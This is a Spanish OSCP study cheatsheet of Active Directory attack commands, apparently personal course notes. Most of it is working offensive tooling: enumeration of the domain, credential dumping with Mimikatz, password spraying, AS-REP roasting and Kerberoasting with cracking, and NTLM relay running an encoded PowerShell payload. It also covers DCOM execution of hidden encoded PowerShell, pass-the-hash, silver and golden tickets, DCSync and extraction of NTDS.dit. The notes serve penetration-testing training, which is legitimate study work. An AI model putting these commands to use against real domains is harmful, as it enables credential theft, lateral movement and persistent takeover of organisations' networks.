---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Active Directory

> [!info] Comandos añadidos a medida que avanzo en los módulos. Módulo → [[22 - Active Directory Introduction and Enumeration]].

> [!tip] Usa **RDP** (`xfreerdp /u: /d: /v:`) con credenciales de dominio para evitar el **Kerberos double-hop**. Carga scripts con `powershell -ep bypass` + `Import-Module`.

## Enumeración con net.exe (rápido, ciego a nested/atributos)
```powershell
net user /domain ; net user <user> /domain
net group /domain ; net group "<grupo>" /domain
net group "<grupo>" <user> /add /domain    # abusar GenericAll (recordar /del para limpiar)
```

## LDAP/.NET casero
Ver → [[Enumeracion AD con LDAP y .NET]].
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN  = ([adsi]'').distinguishedName
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"          # usuarios
LDAPSearch -LDAPQuery "(objectclass=group)"                 # grupos
$g = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=<grupo>))" ; $g.properties.member
```

## PowerView
Ver → [[PowerView]].
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup "<grupo>" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess                                       # ¿dónde soy admin local?
Get-NetSession -ComputerName <host> -Verbose
Get-NetUser -SPN | select samaccountname,serviceprincipalname    # service accounts
Get-ObjectAcl -Identity "<obj>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName <SID>
Find-DomainShare -CheckShareAccess
```

## Sesiones / SPN / shares (legacy + Sysinternals)
```powershell
setspn -L <user>
.\PsLoggedon.exe \\<host>                                   # Remote Registry
ls \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\       # GPP cpassword en SYSVOL
```
```bash
gpp-decrypt "<cpassword>"                                   # clave AES de GPP es pública
```

## BloodHound / SharpHound
Ver → [[BloodHound]]. Se usa como **primer paso** de enumeración de AD (reduce la sobrecarga de información frente a PowerView/LDAP manual); si las queries pre-construidas no dan vectores accionables, es la señal para pasar a métodos manuales.
```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit"
```
```bash
sudo neo4j start          # http://localhost:7474 (neo4j/neo4j -> cambiar password)
bloodhound                # Upload Data (.zip) -> marcar usuario comprometido como "Owned" -> Analysis
```
Queries Cypher útiles:
```text
MATCH (m:Computer) RETURN m                                 # todos los equipos
MATCH (m:User) RETURN m                                     # todos los usuarios
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p     # sesiones activas en todo el dominio
```
Queries pre-construidas (Analysis): *Find all Domain Admins* · *Find Workstations/Servers where Domain Users can RDP* · *Find Computers where Domain Users are Local Admin* · *Shortest Path to Domain Admins from Owned Principals*. Revisar también el **Node Info** de cada usuario (SPN, grupos, flags) manualmente — ahí puede aparecer una SPN kerberoastable que las queries de ruta no destacan.

---

# Ataques a la autenticación (módulo 23)
Módulo → [[23 - Attacking Active Directory Authentication]]. Hashcat: **AS-REP=18200**, **TGS=13100**, **NTLM=1000**.

## Credenciales cacheadas (Mimikatz, admin local)
Ver → [[Mimikatz]].
```text
privilege::debug
sekurlsa::logonpasswords        # NTLM/SHA1 (+plaintext si WDigest) — también credenciales de un Domain Admin con sesión previa en el host
sekurlsa::tickets               # TGT/TGS en LSASS
```

## Password spraying / credential spraying
Ver → [[AD Password Spraying]] · [[CrackMapExec - Spraying de Credenciales]].
```powershell
net accounts                                      # mirar lockout ANTES
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
```bash
crackmapexec smb <ip> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success   # (Pwn3d!)=admin local
crackmapexec smb <lista_IPs> -u <user> -p '<pass>' -d corp.com --shares               # permisos sobre shares, varios hosts a la vez
```

## AS-REP Roasting (user sin preauth)
Ver → [[AS-REP Roasting]].
```bash
impacket-GetNPUsers -dc-ip <dc> -request -outputfile asrep.txt corp.com/<user>
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
```powershell
.\Rubeus.exe asreproast /nowrap        # candidatos: Get-DomainUser -PreauthNotRequired
```

## Kerberoasting (user con SPN)
Ver → [[Kerberoasting]].
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
```bash
impacket-GetUserSPNs -request -dc-ip <dc> corp.com/<user>
hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Relay NTLM forzado desde una aplicación web
Ver → [[NTLM Relay Forzado desde una Aplicacion Web (ntlmrelayx)]]. Requiere SMB signing deshabilitado en el destino (`crackmapexec smb <IP>` → `signing:False`).
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP_destino_signing_false> -c "powershell -enc <b64>"
```
Forzar la autenticación desde un campo de la app que acepte una ruta UNC: `//<IP_kali>/test`.

## Silver ticket (hash NTLM del SPN + domain SID)
Ver → [[Silver Ticket]].
```text
kerberos::golden /sid:<domainSID> /domain:corp.com /ptt /target:<host> /service:http /rc4:<ntlm_spn> /user:jeffadmin
```
```powershell
klist ; iwr -UseDefaultCredentials http://<host>
```

## DCSync (derechos de replicación)
Ver → [[DCSync]].
```text
lsadump::dcsync /user:corp\Administrator        # Mimikatz
```
```bash
impacket-secretsdump -just-dc-user <target> corp.com/<admin>:'<pass>'@<dc>
hashcat -m 1000 hashes.dcsync rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

# Lateral movement y persistencia (módulo 24)
Módulo → [[24 - Lateral Movement in Active Directory]]. Casi todo requiere **admin local** en el destino. PsExec/golden **por hostname = Kerberos**, **por IP = NTLM**.

## Ejecución remota (domain user admin local)
```powershell
wmic /node:<ip> /user:<u> /password:<p> process call create "<cmd>"     # WMI (RPC 135)
winrs -r:<host> -u:<u> -p:<p> "<cmd>"                                    # WinRS (5985/5986)
New-PSSession -ComputerName <ip> -Credential $cred ; Enter-PSSession <id>
.\PsExec64.exe -i \\<host> -u <dom\u> -p <p> cmd                          # ADMIN$ + servicio
# DCOM (MMC20.Application)
$d=[Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<ip>"))
$d.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <b64>","7")
```

## Reutilizar material de autenticación
Ver → [[Pass-the-Hash]] · [[Overpass-the-Hash]] · [[Pass-the-Ticket]].
```bash
impacket-wmiexec -hashes :<NTLM> <user>@<ip>        # Pass the Hash (solo NTLM)
# Hasta el DC a través de un pivote (Proxychains) con hash de un Domain Admin:
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <domain_admin>@<IP_DC>
```
```text
# Mimikatz
sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:powershell    # overpass-the-hash
sekurlsa::tickets /export ; kerberos::ptt <ticket.kirbi>            # pass-the-ticket
```

## Persistencia
Ver → [[Golden Ticket]] · [[Dump NTDS.dit]].
```text
# Golden ticket (hash de krbtgt)
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:<u> /domain:<d> /sid:<SID> /krbtgt:<hash> /ptt
```
```powershell
# Shadow copy -> NTDS.dit (Domain Admin en el DC)
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
</content>
